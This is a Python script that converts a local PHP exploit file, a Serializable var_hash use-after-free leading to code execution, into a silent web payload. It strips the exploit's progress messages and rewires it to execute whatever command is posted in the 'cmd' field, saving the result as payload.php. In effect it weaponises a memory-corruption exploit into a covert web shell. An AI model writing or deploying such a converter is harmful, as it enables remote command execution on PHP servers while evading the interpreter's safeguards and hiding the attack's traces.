import sys

with open('../local_exploit.php', 'rb') as f:
    content = f.read().decode('utf-8', errors='ignore')

lines = content.split('\n')
if lines[0].startswith('#!'): lines = lines[1:]
if lines[0].startswith('<?php'): lines = lines[1:]
content = '\n'.join(lines)

content = content.replace('public function run() {', 'public function run($cmd) {')
content = content.replace('$cmd = "id && uname -a";', '// $cmd = "id && uname -a";')
content = content.replace('echo "=== PHP Serializable var_hash UAF \xe2\x86\x92 RCE ===\\n";', '')
content = content.replace('printf("    Arch: %s    ADDR_MAX=0x%x    DELTA_MAX=0x%x\\n\\n",', '// ')
content = content.replace('php_uname(\'m\'), $this->ADDR_MAX, $this->DELTA_MAX);', '')
content = content.replace('echo "\\n[*] Phase 1: Leaking heap block and target object...\\n";', '')
content = content.replace('echo "[*] Phase 2: Spraying fake Closure objects...\\n";', '')
content = content.replace('echo "[*] Phase 3: Building 64MB mega-string payload...\\n";', '')
content = content.replace('echo "[*] Phase 4: Scanning for zend_object GC memory patterns...\\n";', '')
content = content.replace('echo "\\n[*] Phase 5: Scanning for target function and Handlers...\\n";', '')
content = content.replace('echo "\\n[*] Phase 6: Building the fake closure...\\n";', '')
content = content.replace('echo "\\n[*] Phase 7: Locating the fake closure via EG.symbol_table...\\n";', '')
content = content.replace('echo "\\n[*] Phase 8: Type confusion and RCE...\\n";', '')
content = content.replace('echo "[+] Got fake Closure!\\n\\n";', '')
content = content.replace('echo str_repeat("\\xe2\\x94\\x80", 50) . "\\n";', '')
content = content.replace('echo "\\n" . str_repeat("\\xe2\\x94\\x80", 50) . "\\n";', '')
content = content.replace('echo "\\n[+] Exploit complete.\\n";', '')

# Make it silent basically except for the output
# Some printfs are still there like printf("[+] Leaked block
import re
content = re.sub(r'printf\("\[\+\].*?\\n",.*?;\n', '', content)
content = re.sub(r'printf\("\[\+\].*?\\n"\);\n', '', content)

content = content.replace('(new Exploit)->run();', '(new Exploit)->run($_POST["cmd"] ?? "id");')

with open('payload.php', 'wb') as f:
    f.write(content.encode('utf-8'))
